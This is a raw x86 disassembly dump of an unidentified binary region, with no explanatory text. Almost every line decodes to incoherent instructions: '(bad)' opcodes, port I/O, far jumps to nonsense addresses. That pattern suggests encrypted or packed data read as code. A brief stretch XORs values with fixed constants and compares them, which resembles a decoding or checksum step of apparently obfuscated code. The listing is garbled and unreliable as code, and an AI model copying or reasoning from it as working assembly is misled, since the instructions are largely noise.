  40750c:	inc    DWORD PTR [eax+ebx*2]
  40750f:	repz mov eax,ds:0xa529aec9
  407515:	pushf  
  407516:	jns    0x4074e3
  407518:	and    al,BYTE PTR [ecx+ebp*8]
  40751b:	jmp    0x86d3a060
  407520:	mov    ds:0x3c0944c,eax
  407525:	jo     0x40756e
  407527:	es dec ebx
  407529:	lahf   
  40752a:	add    esi,DWORD PTR [esi]
  40752c:	enter  0xf387,0x5a
  407530:	sahf   
  407531:	mov    bl,0x75
  407533:	mov    eax,0x973946f3
  407538:	ss loope 0x4074be
  40753b:	pop    ebp
  40753c:	mov    eax,0xb9cf61d9
  407541:	mov    eax,DWORD PTR [esi+eiz*2-0x33]
  407545:	test   DWORD PTR [ebx-0x46d9e780],edx
  40754b:	out    dx,eax
  40754c:	jge    0x407596
  40754e:	sub    DWORD PTR [edi],edx
  407550:	sbb    DWORD PTR [edi-0x7f],ebp
  407553:	sbb    eax,0x57faa170
  407558:	retf   0xd7dc
  40755b:	mov    eax,ds:0x91da7068
  407560:	lods   al,BYTE PTR ds:[esi]
  407561:	pushf  
  407562:	enter  0x9910,0xbf
  407566:	sbb    DWORD PTR [ecx],0xffffffc0
  407569:	std    
  40756a:	inc    edx
  40756b:	inc    ebx
  40756c:	pop    eax
  40756d:	(bad)
  407572:	jnp    0x407535
  407574:	cdq    
  407575:	push   ss
  407576:	loope  0x4075d9
  407578:	pushf  
  407579:	jns    0x40752b
  40757b:	pushf  
  40757c:	(bad)  
  40757d:	cli    
  40757e:	jmp    0x2e78:0x7996dfa0
  407585:	in     eax,dx
  407586:	mov    eax,es
  407588:	add    eax,0x285c628
  40758d:	mov    al,ds:0x8b29e822
  407592:	dec    ebp
  407593:	mov    ah,0xf
  407595:	lods   al,BYTE PTR ds:[esi]
  407596:	enter  0xc102,0xe9
  40759a:	add    ah,BYTE PTR [esi-0x75]
  40759d:	enter  0x458b,0xb0
  4075a1:	mov    edx,0x695d
  4075a6:	xor    cx,dx
  4075a9:	mov    edx,DWORD PTR [ebp-0x4c]
  4075ac:	xor    edx,edx
  4075ae:	shl    eax,0x1e
  4075b1:	mov    ax,dx
  4075b4:	or     ax,cx
  4075b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4075ba:	cmp    WORD PTR [ecx],ax
  4075bd:	je     0x407e12
  4075c3:	mov    eax,DWORD PTR [ebp+0x14]
  4075c6:	sub    DWORD PTR [ebp-0x4],eax
  4075c9:	mov    ecx,DWORD PTR [ebx]
  4075cb:	mov    eax,DWORD PTR [ebx+0x4]
  4075ce:	xor    eax,0x9c1b89e8
  4075d3:	xor    ecx,0xca79a577
  4075d9:	shrd   ecx,eax,0x2
  4075dd:	shr    eax,0x2
  4075e0:	mov    DWORD PTR [ebp-0x64],eax
  4075e3:	mov    eax,DWORD PTR [ebx]
  4075e5:	mov    edx,DWORD PTR [ebx+0x4]
  4075e8:	mov    edx,eax
  4075ea:	xor    eax,eax
  4075ec:	or     eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x70],eax
  4075f1:	mov    eax,DWORD PTR [esi]
  4075f3:	mov    ecx,DWORD PTR [esi+0x4]
  4075f6:	xor    ecx,0x9c1b89e8
  4075fc:	xor    eax,0xca79a577
  407601:	jmp    0x4079df
  407606:	mov    dl,0x68
  407608:	jg     0x407620
  40760a:	cmp    ebp,edi
  40760c:	sbb    ah,BYTE PTR [ecx+eax*1]
  40760f:	or     al,0x81
  407611:	mov    al,0x84
  407613:	cmc    
  407614:	jmp    0x4075d4
  407616:	pop    ss
  407617:	jge    0x407631
  407619:	sbb    BYTE PTR [esi+0x11181812],bl
  40761f:	outs   dx,BYTE PTR ds:[esi]
  407620:	imul   edi,eax,0x628d6513
  407626:	scas   eax,DWORD PTR es:[edi]
  407627:	mov    ds:0xef9faffd,eax
  40762c:	fcomp  st(1)
  40762e:	adc    al,0x5f
  407630:	push   ebp
  407631:	mov    eax,ds:0xee5f1496
  407636:	loopne 0x40764f
  407638:	(bad)  
  407639:	xor    ch,bh
  40763b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40763c:	out    dx,al
  40763d:	(bad)  
  40763e:	call   0x146109ad
  407643:	cmp    cl,BYTE PTR [edi+ebp*1-0x113e8bef]
  40764a:	pop    ecx
  40764b:	adc    al,0xbd
  40764d:	and    edx,ecx
  40764f:	popf   
  407650:	xor    BYTE PTR [eax],ch
  407652:	lods   al,BYTE PTR ds:[esi]
  407653:	mov    eax,ds:0x4b21776b
  407658:	fs xchg edi,eax
  40765a:	sahf   
  40765b:	pop    ds
  40765c:	pop    edx
  40765d:	adc    edx,DWORD PTR [ebp+0x607fc783]
  407663:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407664:	mov    cl,0x6f
  407666:	pop    eax
  407667:	push   ds
  407668:	leave  
  407669:	(bad)  
  40766a:	fdiv   QWORD PTR [edx+ebp*8]
  40766d:	mov    esp,DWORD PTR [ebp+0x1938c1b1]
  407673:	cld    
  407674:	cmp    BYTE PTR [esi-0x2c],ah
  407677:	pop    edx
  407678:	in     al,dx
  407679:	fisubr DWORD PTR [ebp-0x7f13071d]
  40767f:	out    0x15,al
  407681:	sbb    BYTE PTR [ebp+0x2eb4db32],bl
  407687:	adc    dl,BYTE PTR [eax+0x22c59274]
  40768d:	lds    ecx,FWORD PTR [esi+0x29]
  407690:	jb     0x4076cc
  407692:	cmp    BYTE PTR [ebp+0x2a],ch
  407695:	cmc    
  407696:	test   BYTE PTR [ebx],0x9d
  407699:	push   ecx
  40769a:	int    0x62
  40769c:	test   DWORD PTR [ecx-0x5b],0xf803b889
  4076a3:	pop    edx
  4076a4:	neg    DWORD PTR ds:0x4d3486ab
  4076aa:	xchg   BYTE PTR [edi-0x1c],al
  4076ad:	push   ebp
  4076ae:	add    esp,DWORD PTR [edx+0x8]
  4076b1:	rol    BYTE PTR ds:[edi+0x1a8a3292],cl
  4076b8:	sahf   
  4076b9:	mov    eax,0x9a6659f7
  4076be:	add    DWORD PTR [eax-0x3],ecx
  4076c1:	sbb    eax,0xe2adec68
  4076c6:	scas   eax,DWORD PTR es:[edi]
  4076c7:	loopne 0x4076a7
  4076c9:	push   ecx
  4076ca:	in     al,dx
  4076cb:	sbb    ah,cl
  4076cd:	inc    edx
  4076ce:	fwait
  4076cf:	mov    ah,0x8a
  4076d1:	lods   eax,DWORD PTR ds:[esi]
  4076d2:	ficom  DWORD PTR [eax]
  4076d4:	test   BYTE PTR [esp+edi*1],dl
  4076d7:	xor    bh,BYTE PTR [ebp-0x5ffa80ff]
  4076dd:	adc    eax,0x483593ca
  4076e2:	mov    esp,0xdad9484a
  4076e7:	call   0x7052:0x405dc0e
  4076ee:	sbb    edi,0x1f
  4076f1:	jbe    0x407755
  4076f3:	sahf   
  4076f4:	ror    BYTE PTR [ecx],cl
  4076f6:	in     al,dx
  4076f7:	xor    eax,ebp
  4076f9:	jb     0x407721
  4076fb:	retf   
  4076fc:	cld    
  4076fd:	loop   0x40777c
  4076ff:	xor    al,0x77
  407701:	ret    0xfe88
  407704:	daa    
  407705:	xor    al,0xd7
  407708:	leave  
  407709:	outs   dx,BYTE PTR ds:[esi]
  40770a:	dec    edx
  40770b:	retf   0x4f28
  40770e:	push   eax
  40770f:	(bad)  
  407710:	test   BYTE PTR [eax+0x11],0xa8
  407714:	fld    QWORD PTR [eax+0x34]
  407717:	ret    0x4cd4
  40771a:	fnstcw WORD PTR [ecx+0x7c7ffd9e]
  407720:	ins    BYTE PTR es:[edi],dx
  407721:	shl    DWORD PTR [ebx+edx*8],1
  407724:	xlat   BYTE PTR ds:[ebx]
  407725:	enter  0xdcc3,0xb1
  407729:	xchg   ecx,eax
  40772a:	cmp    edx,edi
  40772c:	pop    esp
  40772d:	mov    bh,0x2
  40772f:	cmp    DWORD PTR [esi+0x11],edx
  407732:	or     al,BYTE PTR [edx+ebp*4]
  407735:	sbb    ebp,edx
  407737:	inc    esp
  407738:	in     al,dx
  407739:	adc    al,0x2f
  40773b:	add    ah,BYTE PTR [ecx-0x4e]
  40773e:	test   eax,0x3e061437
  407743:	sub    bh,BYTE PTR [edx]
  407745:	cs push 0x75
  407748:	dec    ebx
  407749:	dec    BYTE PTR [ebx+0x16]
  40774c:	into   
  40774d:	aad    0x10
  40774f:	dec    eax
  407750:	fdivr  DWORD PTR [ecx+0x31]
  407753:	and    edx,eax
  407755:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407756:	inc    esi
  407757:	shl    BYTE PTR [ebp+ecx*8-0xf],cl
  40775b:	sub    BYTE PTR [edx],ah
  40775d:	dec    eax
  40775e:	xor    al,0x67
  407760:	nop
  407761:	sub    DWORD PTR [ecx-0x79],esp
  407764:	lods   eax,DWORD PTR ds:[esi]
  407765:	add    eax,DWORD PTR [ecx-0x3e]
  407768:	jle    0x40776d
  40776a:	test   DWORD PTR [ebx+0x4ed69de5],ecx
  407770:	sbb    eax,0x650d0f20
  407775:	xchg   esp,eax
  407776:	call   0xb629:0xa1d5709f
  40777d:	imul   DWORD PTR [eax+0x1c300b1e]
  407783:	mov    edi,0xaaa7c932
  407788:	and    DWORD PTR [ecx-0x128589b3],ecx
  40778e:	(bad)
  407791:	or     esp,DWORD PTR [esi+0x2e]
  407794:	sub    esi,DWORD PTR [eax-0x19]
  407797:	lds    esi,FWORD PTR [esi-0x5078dc1f]
  40779d:	add    eax,0xe53838d5
  4077a2:	test   al,0xd3
  4077a4:	sbb    ecx,esi
  4077a6:	xor    BYTE PTR [esi-0x43],dl
  4077a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077aa:	mov    esi,0xebd26b8d
  4077af:	pop    es
  4077b0:	das    
  4077b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077b2:	clc    
  4077b3:	cmp    BYTE PTR [ecx+0x75b0c230],dl
  4077b9:	fsubrp st(1),st
  4077bb:	fisub  WORD PTR [edx-0x68]
  4077be:	popf   
  4077bf:	xor    ah,0xc
  4077c2:	push   ss
  4077c3:	pop    ebx
  4077c4:	and    al,0xe3
  4077c6:	xlat   BYTE PTR ds:[ebx]
  4077c7:	in     al,0x4e
  4077c9:	ror    DWORD PTR [esi+ebx*4-0x4c],1
  4077cd:	call   0x6c97:0x30a4d605
  4077d4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077d6:	xor    eax,esi
  4077d8:	(bad)  [edx]
  4077da:	adc    al,0x23
  4077dc:	adc    cl,dh
  4077de:	repz jl 0x407850
  4077e1:	dec    ecx
  4077e2:	shr    cl,0x12
  4077e5:	lods   al,BYTE PTR ds:[esi]
  4077e6:	dec    ebx
  4077e7:	sbb    ecx,0xffffff87
  4077ea:	inc    ecx
  4077eb:	hlt    
  4077ec:	in     al,0x56
  4077ee:	ins    BYTE PTR es:[edi],dx
  4077ef:	jnp    0x407829
  4077f1:	jb     0x407843
  4077f3:	(bad)  
  4077f5:	cli    
  4077f6:	xor    eax,0xbc7a329f
  4077fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077fc:	sub    DWORD PTR [esi],ebp
  4077fe:	pop    esp
  4077ff:	fiadd  DWORD PTR [ebx]
  407801:	mul    ebx
  407803:	fwait
  407804:	jnp    0x4077f1
  407806:	pushf  
  407807:	adc    bl,dl
  407809:	cmp    esi,edx
  40780b:	dec    ebx
  40780c:	out    0x93,ax
  40780f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407810:	out    0x2d,al
  407812:	sub    ebx,0xffffffdd
  407815:	mov    cl,0x5d
  407817:	push   ebx
  407818:	stc    
  407819:	mov    dh,0xb9
  40781b:	mov    ch,0x35
  40781d:	retf   
  40781e:	mov    ch,0xb4
  407820:	mul    DWORD PTR [edx]
  407822:	rcr    DWORD PTR [esi+0x74936e06],1
  407828:	mov    dl,0xa2
  40782a:	shr    DWORD PTR [esp+eiz*8+0x1bf87b77],0x22
  407832:	push   0x53ee4a4d
  407837:	jle    0x407879
  407839:	mov    edx,0xd4c63299
  40783e:	leave  
  40783f:	and    bl,ah
  407841:	mov    ds:0xe85af706,al
  407846:	pop    ds
  407847:	jg     0x407897
  407849:	jp     0x4078bd
  40784b:	dec    eax
  40784c:	arpl   WORD PTR [ebx],cx
  40784e:	xchg   DWORD PTR [ebx],ebp
  407850:	outs   dx,DWORD PTR ds:[esi]
  407851:	cmp    BYTE PTR [edi],bh
  407853:	mov    ecx,0xcf37af3a
  407858:	xchg   esi,eax
  407859:	fdiv   QWORD PTR [ebx]
  40785b:	std    
  40785c:	adc    ecx,eax
  40785e:	mov    edi,0x4f15c2f4
  407863:	mov    dh,0x20
  407865:	frstor [edi]
  407867:	or     al,0x10
  407869:	mov    eax,ds:0xdff6c63e
  40786e:	adc    ch,BYTE PTR [eax-0x5148a01d]
  407874:	in     eax,0x84
  407876:	sub    DWORD PTR [ebp+ebx*1-0x78],0xc52f964e
  40787e:	and    eax,0x80165b36
  407883:	pushf  
  407884:	ret    0xd4da
  407887:	mov    bl,0x1c
  407889:	mov    eax,ds:0xf66f67e2
  40788e:	inc    ebp
  40788f:	in     eax,0x76
  407891:	sub    dh,BYTE PTR [ebx]
  407893:	scas   al,BYTE PTR es:[edi]
  407894:	stos   BYTE PTR es:[edi],al
  407895:	shr    BYTE PTR [ebx-0x12b455d6],cl
  40789b:	ins    DWORD PTR es:[edi],dx
  40789c:	dec    BYTE PTR [ebx-0x7a]
  40789f:	cmp    DWORD PTR [edi-0x72],ebp
  4078a2:	dec    ecx
  4078a3:	inc    ebp
  4078a4:	shr    ah,0xc1
  4078a7:	not    edi
  4078a9:	loop   0x40787a
  4078ab:	and    eax,0x2486abf9
  4078b0:	inc    edx
  4078b1:	jo     0x407842
  4078b3:	fs dec edx
  4078b5:	jmp    0x8c061381
  4078ba:	je     0x407871
  4078bc:	lahf   
  4078bd:	push   edi
  4078be:	lods   al,BYTE PTR ds:[esi]
  4078bf:	mov    eax,ds:0xbae9316e
  4078c4:	leave  
  4078c5:	cmp    eax,0x2770c5b9
  4078ca:	sub    DWORD PTR [edx+0x6f166958],esp
  4078d0:	cld    
  4078d1:	dec    esp
  4078d2:	out    dx,eax
  4078d3:	scas   eax,DWORD PTR es:[edi]
  4078d4:	pop    esp
  4078d5:	cmp    BYTE PTR [edi-0x79],ch
  4078d8:	pop    edx
  4078d9:	mov    DWORD PTR [esi-0x482176d],esp
  4078df:	es cmc 
  4078e1:	clc    
  4078e2:	es call 0x8351:0xa21fbf28
  4078ea:	rol    ebp,1
  4078ec:	lock das 
  4078ee:	dec    ebx
  4078ef:	pop    esi
  4078f0:	push   ebp
  4078f1:	jge    0x40792d
  4078f3:	es shr esi,cl
  4078f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078f7:	pop    esp
  4078f8:	ret    
  4078f9:	sbb    bl,0x73
  4078fc:	iret   
  4078fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078fe:	sbb    edi,DWORD PTR [ecx]
  407900:	sahf   
  407901:	add    esp,DWORD PTR [ebp+0x3ea92df7]
  407907:	inc    edi
  407908:	ds jg  0x4078cd
  40790b:	push   es
  40790c:	cmp    BYTE PTR [edi],dl
  40790e:	out    0x19,al
  407910:	sbb    DWORD PTR [edi],eax
  407912:	and    BYTE PTR [esi+0x114f32aa],0x4f
  407919:	lea    ecx,[ecx]
  40791b:	lds    esp,FWORD PTR [edi+0x30]
  40791e:	mov    ecx,0xbb7a4d87
  407923:	icebp  
  407924:	push   edx
  407925:	dec    BYTE PTR [ebp+0x77]
  407928:	adc    ch,bh
  40792a:	mov    ebx,0xd18dff5b
  40792f:	cmc    
  407930:	std    
  407931:	sbb    al,0xa3
  407933:	repnz add edi,DWORD PTR [eax+0x5710b2a0]
  40793a:	ins    BYTE PTR es:[edi],dx
  40793b:	aad    0x8
  40793d:	out    0xfb,al
  40793f:	dec    eax
  407940:	xor    edi,DWORD PTR [edi]
  407942:	loopne 0x40790a
  407944:	shl    ebx,1
  407946:	jmp    0x407942
  407948:	add    DWORD PTR es:[eax],ebp
  40794b:	lock xor BYTE PTR fs:[ebp-0x75],0x0
  407951:	xchg   si,ax
  407953:	inc    esi
  407954:	(bad)  
  407955:	enter  0x6540,0xc9
  407959:	mov    edi,0x21bc57f1
  40795e:	xchg   ebx,eax
  40795f:	mov    ?,WORD PTR [ebx-0x4e4de194]
  407965:	mov    BYTE PTR [ebx],bl
  407967:	xchg   BYTE PTR [edi+0x73b7dc56],dh
  40796d:	push   ebp
  40796e:	popf   
  40796f:	sub    BYTE PTR [ebx+0xae0db04],cl
  407975:	cwde   
  407976:	or     DWORD PTR [edi-0x1693af0],0x68
  40797d:	loopne 0x4079fd
  40797f:	jo     0x40794e
  407981:	mov    ch,0xd4
  407983:	add    esi,DWORD PTR [edi+0x79]
  407986:	pop    esi
  407987:	inc    ecx
  407988:	push   0xffffffd9
  40798a:	into   
  40798b:	jg     0x407967
  40798d:	cmp    ebx,ebp
  40798f:	(bad)  
  407990:	loopne 0x40791c
  407992:	jg     0x4079e4
  407994:	iret   
  407995:	daa    
  407996:	jo     0x4079fa
  407998:	cmp    esi,ebp
  40799a:	cwde   
  40799b:	sub    DWORD PTR [edx-0x22],edx
  40799e:	in     al,dx
  40799f:	push   esi
  4079a0:	shl    DWORD PTR [ebp-0x56ad5711],0x88
  4079a7:	push   cs
  4079a8:	inc    ebp
  4079a9:	xor    ch,bh
  4079ab:	or     BYTE PTR [eax+0x42],ch
  4079ae:	jae    0x4079c9
  4079b0:	jge    0x40799a
  4079b2:	hlt    
  4079b3:	mov    edi,0xb9742be0
  4079b8:	loopne 0x4079cb
  4079ba:	inc    esi
  4079bb:	mov    ah,0xcc
  4079bd:	int3   
  4079be:	ficomp WORD PTR [ecx+0x4ac89a7b]
  4079c4:	mov    edx,DWORD PTR [edx+eax*2]
  4079c7:	pop    es
  4079c8:	out    0xab,eax
  4079ca:	pop    eax
  4079cb:	push   edx
  4079cc:	fs pop ecx
  4079ce:	imul   edx,DWORD PTR [eax+0x75],0xffffffa6
  4079d2:	sbb    DWORD PTR [ebp-0x1bb2a88],esp
  4079d8:	mov    bh,0xbd
  4079da:	fsub   st(7),st
  4079dc:	lock add DWORD PTR [ecx],esp
  4079df:	mov    DWORD PTR [ebp-0x34],eax
  4079e2:	jmp    0x407dc0
  4079e7:	repnz jecxz 0x407a47
  4079ea:	jmp    0x407a49
  4079ec:	imul   esp,DWORD PTR [ebx-0x25],0xffffffa9
  4079f0:	pushf  
  4079f1:	pop    ds
  4079f2:	jle    0x407a2d
  4079f4:	push   edx
  4079f5:	inc    ebx
  4079f6:	push   0xffffff9d
  4079f8:	jne    0x407a12
  4079fa:	sbb    BYTE PTR [esi+0x3f181812],bl
  407a00:	repnz (bad) 
  407a02:	es jne 0x407a00
  407a05:	mov    esp,0x80f06c23
  407a0a:	dec    esp
  407a0b:	xchg   esp,eax
  407a0c:	loop   0x4079c1
  407a0e:	inc    ebx
  407a0f:	dec    eax
  407a10:	xchg   ecx,eax
  407a11:	(bad)  
  407a12:	in     eax,dx
  407a13:	adc    al,0xbb
  407a15:	mov    ah,0xf1
  407a17:	dec    ebp
  407a18:	fldenv ds:0x3dd12ecc
  407a1e:	test   BYTE PTR [edx+0x3e223c63],bh
  407a24:	popa   
  407a25:	sub    eax,0x84809534
  407a2a:	or     BYTE PTR [ecx+ebp*8+0x29b8ab12],cl
  407a31:	inc    ebx
  407a32:	call   0x46dc:0xb8baaaa2
  407a39:	mov    edx,0x675b443f
  407a3e:	daa    
  407a3f:	and    esp,DWORD PTR [ecx+0x4d]
  407a42:	mov    ch,BYTE PTR [edi-0x600afbf3]
  407a48:	sub    BYTE PTR [edx],dh
  407a4a:	fisttp WORD PTR [esi-0x728266a5]
  407a50:	mov    bh,0x8f
  407a52:	and    BYTE PTR ds:0xe7dc974c,bl
  407a58:	fidiv  DWORD PTR [eax-0x358bffee]
  407a5e:	rcl    cl,cl
  407a60:	mov    dh,0x1f
  407a62:	xchg   DWORD PTR [edi+0x33],eax
  407a65:	call   0xb1ee:0xf1b2a9df
  407a6c:	fisttp QWORD PTR [edx+0x47]
  407a6f:	xchg   DWORD PTR [ecx],ecx
  407a71:	stos   BYTE PTR es:[edi],al
  407a72:	dec    ecx
  407a73:	push   eax
  407a74:	cmp    DWORD PTR [edx],ebp
  407a76:	aas    
  407a77:	mov    edx,0xd73eda54
  407a7c:	mov    bl,0xb5
  407a7e:	pop    ebx
  407a7f:	das    
  407a80:	push   edx
  407a81:	sub    BYTE PTR [edi+0x350460ae],bh
  407a87:	std    
  407a88:	mov    ebp,0xe1dd335b
  407a8d:	scas   al,BYTE PTR es:[edi]
  407a8e:	cmp    al,0xf3
  407a90:	jge    0x407a73
  407a92:	sub    edi,DWORD PTR [ecx+ebx*4]
  407a95:	xor    eax,0xbcce0073
  407a9a:	mov    al,ds:0x4841e40d
  407a9f:	pop    es
  407aa0:	in     eax,0xc2
  407aa2:	(bad)
  407aa5:	push   ds
  407aa6:	adc    edi,edi
  407aa8:	mov    ebp,0x3d9462e6
  407aad:	(bad)  
  407aae:	jmp    0x36e856e
  407ab3:	lds    ecx,FWORD PTR [ebx]
  407ab5:	loope  0x407a5e
  407ab7:	xor    BYTE PTR [eax],dl
  407ab9:	loopne 0x407a70
  407abb:	mov    BYTE PTR [ebx+0x55],dl
  407abe:	stc    
  407abf:	bound  ebx,QWORD PTR [ebx+0x4]
  407ac2:	es push ss
  407ac4:	popf   
  407ac5:	mov    ss:0x1cb52cc8,eax
  407acb:	cwde   
  407acc:	mov    ah,bh
  407ace:	pop    esp
  407acf:	ret    
  407ad0:	sar    esp,cl
  407ad2:	or     DWORD PTR [edx+0x78],ecx
  407ad5:	bound  ecx,QWORD PTR [ebx+edi*1+0x2a6ae2cc]
  407adc:	out    0xd5,al
  407ade:	data16 adc BYTE PTR [ebx-0x5596b544],bl
  407ae5:	push   esi
  407ae6:	push   esi
  407ae7:	jmp    0x820:0xd0c5fd6a
  407aee:	or     esi,eax
  407af0:	(bad)  
  407af1:	sar    DWORD PTR [ebp+0x4a],cl
  407af4:	dec    ecx
  407af5:	lods   eax,DWORD PTR ds:[esi]
  407af6:	aaa    
  407af7:	xchg   esp,eax
  407af8:	pop    esp
  407af9:	shl    BYTE PTR [ecx],1
  407afb:	pop    esp
  407afc:	mov    ds,edi
  407afe:	ss test eax,0xbc614f43
  407b04:	xor    BYTE PTR [esi+0x7b4ab517],0x41
  407b0b:	pop    ebx
  407b0c:	pop    esp
  407b0d:	mov    dl,0xaa
  407b0f:	pusha  
  407b10:	lea    esi,[ebp-0x2f]
  407b13:	imul   ecx,DWORD PTR [ebx],0x7f
  407b16:	inc    esp
  407b17:	add    eax,eax
  407b19:	inc    ebx
  407b1a:	push   ebx
  407b1b:	out    dx,eax
  407b1c:	loop   0x407b5f
  407b1e:	(bad)  
  407b1f:	(bad)  
  407b20:	dec    ebx
  407b21:	lods   al,BYTE PTR ds:[esi]
  407b22:	push   ebp
  407b23:	popf   
  407b24:	retf   0x79ba
  407b27:	pop    edx
  407b28:	frstor [esi-0x51]
  407b2b:	test   al,0x2f
  407b2d:	xchg   ah,dl
  407b2f:	stos   DWORD PTR es:[edi],eax
  407b30:	data16 mov al,ds:0x63de2ef1
  407b36:	and    eax,0xb86a73bd
  407b3b:	sbb    ebx,ebx
  407b3d:	inc    edi
  407b3e:	xchg   BYTE PTR [ebx-0x73698177],ah
  407b44:	outs   dx,DWORD PTR ds:[esi]
  407b45:	scas   eax,DWORD PTR es:[edi]
  407b46:	sbb    al,0xc9
  407b48:	and    eax,0xae355032
  407b4d:	sbb    DWORD PTR [esi-0x5d],ebx
  407b50:	lock mov cl,0xb5
  407b53:	pop    esi
  407b54:	inc    eax
  407b55:	mov    dh,0x37
  407b57:	mov    bh,BYTE PTR [ecx-0x3bade73a]
  407b5d:	dec    esi
  407b5e:	pop    ebp
  407b5f:	test   DWORD PTR [edx+0x16c6051c],esi
  407b65:	mov    dh,0xa0
  407b67:	cdq    
  407b68:	pop    ds
  407b69:	loopne 0x407b0e
  407b6b:	gs push ss
  407b6d:	jbe    0x407b4b
  407b6f:	xor    DWORD PTR [edi+0x5d],esi
  407b72:	pop    esp
  407b73:	ror    BYTE PTR [ecx+0x12],cl
  407b76:	mov    dl,ah
  407b78:	jb     0x407b64
  407b7a:	pusha  
  407b7b:	popa   
  407b7c:	jmp    0xfc28:0x7c140b0a
  407b83:	fidivr WORD PTR ds:[edx+0x71]
  407b87:	mov    ah,al
  407b89:	aam    0x31
  407b8b:	push   edi
  407b8c:	je     0x407c07
  407b8e:	add    eax,ebp
  407b90:	in     al,dx
  407b91:	sub    edx,DWORD PTR [edx+0x63]
  407b94:	or     DWORD PTR [ebp-0x50],eax
  407b97:	mov    ch,al
  407b99:	shl    DWORD PTR [edi],cl
  407b9b:	or     eax,0x93f3b178
  407ba0:	sub    ebx,DWORD PTR [edi]
  407ba2:	mov    esp,0x638b673a
  407ba7:	aas    
  407ba8:	add    DWORD PTR [ebx-0x39],ebp
  407bab:	into   
  407bac:	lea    eax,[ecx]
  407bae:	xchg   ebp,eax
  407baf:	outs   dx,DWORD PTR ds:[esi]
  407bb0:	sub    dl,BYTE PTR [ecx]
  407bb2:	mov    edi,DWORD PTR [eax]
  407bb4:	sti    
  407bb5:	aad    0x38
  407bb7:	dec    ebp
  407bb8:	test   DWORD PTR [esi+0x4f2eca5a],0x4875d695
  407bc2:	out    0x4a,eax
  407bc4:	jge    0x407b96
  407bc6:	sub    al,0x21
  407bc8:	fmul   DWORD PTR [edx+eiz*8]
  407bcb:	mov    gs,eax
  407bcd:	pop    ss
  407bce:	ins    BYTE PTR es:[edi],dx
  407bcf:	mov    cl,0x91
  407bd1:	(bad)  
  407bd2:	fucompp 
  407bd4:	addr16 push edx
  407bd6:	test   BYTE PTR [edi+0x68],al
  407bd9:	loope  0x407bb3
  407bdb:	pushf  
  407bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bdd:	push   ebx
  407bde:	enter  0x3f4a,0xdc
  407be2:	test   al,0x78
  407be4:	shl    DWORD PTR [esi],cl
  407be6:	sbb    BYTE PTR [ebp+eiz*2-0x6488f04c],dl
  407bed:	and    al,0x9e
  407bef:	xor    DWORD PTR [ebx-0x24544b31],esp
  407bf5:	jecxz  0x407c0d
  407bf7:	fs vaddpd ymm1,ymm6,ymm3
  407bfc:	fsubr  DWORD PTR [ebx-0x4]
  407bff:	iret   
  407c00:	add    BYTE PTR ds:0xb13cb845,ah
  407c06:	ret    
  407c07:	push   ebp
  407c08:	xor    edi,eax
  407c0a:	mov    esi,?
  407c0c:	and    dh,BYTE PTR [ecx+edx*1]
  407c0f:	jl     0x407c47
  407c11:	pop    ss
  407c12:	test   DWORD PTR [ebp+edi*2-0x4c],0xb3fd2cfd
  407c1a:	or     edx,DWORD PTR [eax]
  407c1c:	fnstsw WORD PTR ds:0x50104361
  407c22:	jmp    0xb16:0x91e90bc7
  407c29:	call   0x8b26:0x7c22b361
  407c30:	pop    esp
  407c31:	jmp    0x407c5c
  407c33:	sar    BYTE PTR [ebx-0x40ea04b3],0x55
  407c3a:	loope  0x407c30
  407c3c:	cdq    
  407c3d:	pop    esp
  407c3e:	push   ds
  407c3f:	pop    ecx
  407c40:	xor    edx,DWORD PTR [ebp+0x673e6a03]
  407c46:	in     al,0xd1
  407c48:	jmp    0x407be4
  407c4a:	mov    ah,0x7b
  407c4c:	lds    esi,FWORD PTR [eax]
  407c4e:	sbb    DWORD PTR [edi+edi*1+0x194f8de3],eax
  407c55:	mov    ds:0xb7215272,al
  407c5a:	std    
  407c5b:	dec    ebp
  407c5c:	jg     0x407c65
  407c5e:	js     0x407c12
  407c60:	call   0x6600e1e
  407c65:	pop    eax
  407c66:	inc    ebp
  407c67:	pop    esi
  407c68:	test   ebp,ecx
  407c6a:	xchg   esp,eax
  407c6b:	jne    0x407c81
  407c6d:	inc    eax
  407c6e:	xchg   edi,eax
  407c6f:	xor    dh,ch
  407c71:	push   edi
  407c72:	pushf  
  407c73:	sbb    DWORD PTR [edx-0x32099d60],ebx
  407c79:	jne    0x407cdb
  407c7b:	dec    ecx
  407c7c:	push   cs
  407c7d:	(bad)  
  407c7e:	aam    0x37
  407c80:	ret    0x2f7d
  407c83:	test   eax,0xbace004d
  407c88:	mov    edx,fs
  407c8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c8b:	sub    edi,eax
  407c8d:	pop    esi
  407c8e:	dec    eax
  407c8f:	and    esi,DWORD PTR [ecx]
  407c91:	mov    eax,0x1c918601
  407c96:	push   ecx
  407c97:	jno    0x407c4e
  407c99:	test   edi,esp
  407c9b:	mov    al,ds:0x829b349c
  407ca0:	int    0xe8
  407ca2:	xchg   edx,eax
  407ca3:	das    
  407ca4:	repnz in al,dx
  407ca6:	nop
  407ca7:	div    DWORD PTR [ecx+0xe]
  407caa:	(bad)  
  407cab:	xchg   ebp,eax
  407cac:	ret    0x5a29
  407caf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cb0:	(bad)  
  407cb2:	not    BYTE PTR [eax-0x2a]
  407cb5:	arpl   WORD PTR [ebx+edi*1+0x22],di
  407cb9:	or     al,cl
  407cbb:	xor    al,0xa
  407cbd:	jo     0x407cff
  407cbf:	mov    ecx,0x9ed60369
  407cc4:	and    al,0x23
  407cc6:	in     eax,dx
  407cc7:	in     eax,dx
  407cc8:	dec    esp
  407cc9:	mov    dh,0x34
  407ccb:	jmp    0x199276e
  407cd0:	jmp    0x407c6b
  407cd2:	jmp    0x5d7d:0x48f2a4f
  407cd9:	sbb    ebp,edx
